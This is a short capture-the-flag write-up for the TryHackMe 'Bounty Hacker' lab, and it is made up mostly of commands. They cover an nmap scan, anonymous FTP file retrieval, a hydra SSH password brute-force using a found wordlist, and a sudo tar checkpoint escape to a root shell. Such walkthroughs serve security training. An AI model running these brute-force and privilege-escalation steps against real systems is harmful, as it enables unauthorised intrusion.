# TryHackMe – Bounty Hacker Write-up

### Nmap Scan
```bash
 nmap -sV -A <IP address>
 ```

![alt text](images/image.png)
### ftp Access
```bash
 ftp <IP address> 
``` 
 username anonymous 

 passsword anonymous

 ![alt text](images/image-1.png)
### ftp File Listing
```bash
 dir
```

![alt text](images/image-2.png)
### File Retrieval
```bash
 get task.txt
 ```

![alt text](images/image-3.png)

```bash
 get locks.txt
 ```

![alt text](images/image-4.png)
### File Content Enumeration
```bash
 cat task.txt
 ```

![alt text](images/image-5.png)

```bash
 cat locks.txt
 ```

![alt text](images/image-6.png)
### SSH brute-force
```bash
 hydra -l lin -P locks.txt ssh://<IP address>
 ```

![alt text](images/image-7.png)
### SSH Access
```bash
 ssh lin@<IP address> -P 2222 
 ```

![alt text](images/image-8.png)
### Privilege escalation
```bash
 sudo -l
 ```

![alt text](images/image-9.png)

#### Note:
 The output revealed that lin is allowed to execute /bin/tar as root

### root Access
```bash
 sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```

![alt text](images/image-11.png)
#### Note: 
 use https://gtfobins.org/


